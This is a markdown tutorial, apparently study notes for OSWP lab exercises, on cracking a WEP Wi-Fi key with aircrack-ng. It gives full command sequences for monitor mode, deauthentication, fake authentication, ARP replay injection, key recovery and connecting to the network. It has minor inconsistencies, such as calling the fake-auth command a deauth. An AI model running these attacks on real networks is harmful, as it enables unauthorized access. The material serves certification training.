
# 🛡️ WEP Attack
## Time to perform the attack: 7 minutes

## ⚙️ Initial Setup

Let's go!

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
```

This will enables monitor mode on `wlan0mon`.

---

## 🔍 Network Scanning

At this point we want to scan the Network

```bash
sudo airodump-ng wlan0mon
```
With this command we want to identify WEP Network and grab:

- `BSSID`
- `Channel`
- `Associated Clients` (STATION)

**REMEMBER**: Check what AP’s are active on frequency band 2,4Ghz (WEP was never designed for the 5Ghz band).

Also, all these info come together with all the other networks so it could be a little bit messy to keep analyzing things from here. 
**We need to focus just on what we need. (press CTRL+C to stop the current monitor).** 

So, let's run again airodump-ng targeting just the channel for the WEP Network.

---

## 🎯 2. Targeted Sniffing

```bash
channel=3
sudo airodump-ng -c ${channel} wlan0mon
```
Note: It can take a while before a station connects. 
Once you have it grab the CHANNEL, BSSID, ESSID, and the CLIENT we want to focus on in the attack step.

```bash
channel=3
bssid='F0:9F:C2:71:22:11'
essid='wifi-old'
client='3E:C8:44:0A:24:BA'
```

Now we are ready to **Capture the Handshake**, in particular we will capture an **authentication handshake frame**.

---

## Start the Attack

For WEP we will do a deauthentication attack plus ARP injection.

Let's see why

### Deauth Attack
Here we send deauth frames to a connected client. This forces the client to disconnect and reconnect to the WEP network.

Upon reconnection, there's a high chance the client will send an **ARP request** to the access point — **this** is the perfect packet to capture.

### Capture ARP + Start Injection
Once the ARP request is captured, tools like `aireplay-ng -3` can replay it repeatedly, causing the AP to send out tons of encrypted responses — each using **a new IV** (Initialization Vector).

This allows you to accumulate enough IVs quickly for aircrack-ng to recover the WEP key via statistical analysis.

In a new terminal tab let's start sniffing specifically on AP ‘wifi-corp’ and dump the output in a capture file.

```bash
mkdir WEP

channel=3
bssid='F0:9F:C2:71:22:11'
essid='wifi-old'
client='3E:C8:44:0A:24:BA'

sudo airodump-ng -c ${channel}  -w dump-wep --output-format pcap,csv --essid ${essid} --bssid ${bssid} wlan0mon
```

---

Now deauth the client!

## 💣 De-AUTH

In a second terminal tab send a deauthentication frame. 

In that case the connected client will try to re-authenticate again during our capture.


```bash
bssid='F0:9F:C2:71:22:11'
essid='wifi-old'
client='3E:C8:44:0A:24:BA'

sudo aireplay-ng -1 3600 -q 10 -a ${bssid} -e ${essid} -c ${client} wlan0mon
```
This forces a client to reconnect and trigger ARP traffic.

When you see **Association Succesfull :-)** press CTRL+C to stop the De-Auth process

In the same terminal generate traffic in order to find duplicate IV’s

```bash
bssid='F0:9F:C2:71:22:11'
essid='wifi-old'
client='3E:C8:44:0A:24:BA'

sudo aireplay-ng -3 -b ${bssid} -h ${client} wlan0mon
```

**And when you captured at least 10.000 ARP requests, return to terminal 1 and press CTRL+C to stop airodump.**

Also, stop monitoring on wlan0mon

```bash
sudo airmon-ng stop wlan0mon
```
---

## 🔓 Crack the WEP Key

Use aircrack to crack the WEP authentication request. 


```bash
aircrack-ng dump-wep-01.cap
```

Expected result:

```
KEY FOUND! [ 12:34:56:78:90 ]
```
---

## 🔌 Connect Using wpa_supplicant

### wep.conf

# create a WEP connection file
```bash
wep_key=11BB33CD55 #you need to remove the colons
essid='wifi-old'
cat << EOF > /tmp/wep.conf
 network={
           ssid="${essid}"
           key_mgmt=NONE
           wep_key0=${wep_key}
           wep_tx_keyidx=0
          }
EOF
```

```bash
sudo wpa_supplicant -i wlan0 -c wep.conf
```
and in another terminal 

```bash
sudo dhclient wlan0 -v
```

---

## ✅ 7. Verify Connection

```bash
target=192.168.1.1
curl http://${target}/proof.txt
```

---

## 🧠 Extra: 
### IP vs Gateway Explanation

- **192.168.1.48** is your local IP, assigned via DHCP by the router.
- **192.168.1.1** is usually the **gateway/router**, your exit to the rest of the network or internet.
- Pinging `192.168.1.1` checks if you're actually connected to the router.
- Pinging `192.168.1.48` means you're pinging yourself — useful only for internal stack checks.

✅ Key Concept

**ARP injection is still the main cracking technique used to flood the network with IVs.**

Deauth is not a replacement, but rather a trigger mechanism to cause the ARP packet to be sent by the client.

📌 It's worth noting that in environments with no active clients or no traffic, it’s common to combine:

        Fake authentication

        Deauth to trigger ARP

        ARP injection

How to do it? with your MAC address! 

Get your interface MAC (before monitor mode) via:

```bash
cat /sys/class/net/wlan0/address
```
or
```bash
ip link show wlan0
```

### Fake auth differences

❓ Are these two commands the same?

```bash
sudo aireplay-ng --fakeauth 0 -a <BSSID> -h <YOUR_MAC> wlan0mon
```

vs

```bash
sudo aireplay-ng -1 3600 -q 10 -a <BSSID> wlan0mon
```

No! they are not! they are similar but not the same. And here is why: 

## 📌 Command 1 – One-Time Fake Auth

```bash
sudo aireplay-ng --fakeauth 0 -a <BSSID> -h <YOUR_MAC> wlan0mon
```

- Performs a **single fake authentication attempt** with 0ms timeout.
- Registers your MAC with the target AP so it accepts injected packets.
- Output when successful:

  ```
  Authentication successful
  ```

✅ Use this for **quick testing** or **simple APs**.  
🚫 If the AP drops your session (timeout, range issues), injection will fail.

---

## 📌 Command 2 – Persistent Re-Auth

```bash
sudo aireplay-ng -1 3600 -q 10 -a <BSSID> wlan0mon
```

- `-1 3600`: re-authenticate every **3600 seconds** (1 hour).
- `-q 10`: show status every **10 seconds**.
- More stable for long-running injection or strict APs.

✅ Recommended for **OSWP labs**, **unstable links**, or **demanding routers**.

---

## 🧠 TL;DR Summary

| Command | Type | When to Use |
|--------|------|-------------|
| `--fakeauth 0` | Single shot | Quick tests, permissive routers |
| `-1 3600 -q 10` | Persistent | Long sessions, lab setup, unstable auth |

---

## 💡 Pro Tip

- Use **persistent fake auth** before launching `--arpreplay`.
- If fakeauth fails:
  - Try a different MAC with `macchanger`
  - Move closer to the AP
  - Add delay: `--fakeauth 60000`

---

Chapter closed. WEP is toast. Ready for WPA2? 😎
